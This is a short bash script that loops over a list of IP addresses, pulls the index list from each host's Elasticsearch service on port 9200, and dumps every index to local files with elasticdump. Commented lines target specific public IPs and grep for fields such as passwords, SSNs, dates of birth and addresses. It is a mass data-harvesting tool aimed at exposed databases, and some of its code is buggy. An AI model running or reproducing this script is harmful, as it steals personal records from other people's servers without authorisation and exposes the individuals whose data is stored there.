#!/bin/bash

while read i; do
    echo "working on $i"
    mkdir 'files/$i' 
    indices=$(curl -X GET "http://$i:9200/_cat/indices?h=i");for INDEX in http://$i:9200$indices;do elasticdump --input=http://$i:9200/$INDEX --output=files/$i/$INDEX.json --limit=10000; done
done <ips_complete.txt

#for INDEX in http://107.20.1.248:9200$indices;
#elasticdump --input=http://$i:9200/$EI --output=files/$i/$i-$EI.json --limit=10000;done
#elasticdump --input=http://52.9.13.157:9200/$EI --output=52.9.13.157-orders-2018.03.01.json --limit=10000;done
#curl -X GET "http://107.20.1.248:9200/indicies?h=i&s=docs.count:desc | head -n1"
#curl -X GET "http://107.20.1.248:9200/_all/_mapping" | grep 'password\|dob\|username\|ssn\|email\|address\|'



#indices=$(curl -X GET "http://107.20.1.248:9200/_cat/indices?h=i");mkdir 107.20.1.248;cd 107.20.1.248;for INDEX in http://107.20.1.248:9200$indices;do elasticdump --input=107.20.1.248/$INDEX --output=$INDEX --type=data; done
